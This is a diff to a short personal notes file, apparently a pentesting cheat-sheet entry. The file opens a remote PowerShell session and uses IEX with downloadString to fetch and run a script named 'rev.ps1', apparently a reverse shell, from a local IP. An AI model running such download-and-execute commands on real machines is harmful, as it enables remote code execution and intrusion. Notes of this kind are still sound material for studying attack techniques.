@@ -5,6 +5,8 @@ $sess = New-PSSession -computer ComputerHostname
 Invoke-Command -Session $sess -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
 ```
 
+` zet/20221003150472/README.md `
+
 # Related
 
 - [20221003150475](/zet/20221003150475/README.md) powershell tricks run powershell commands as another user
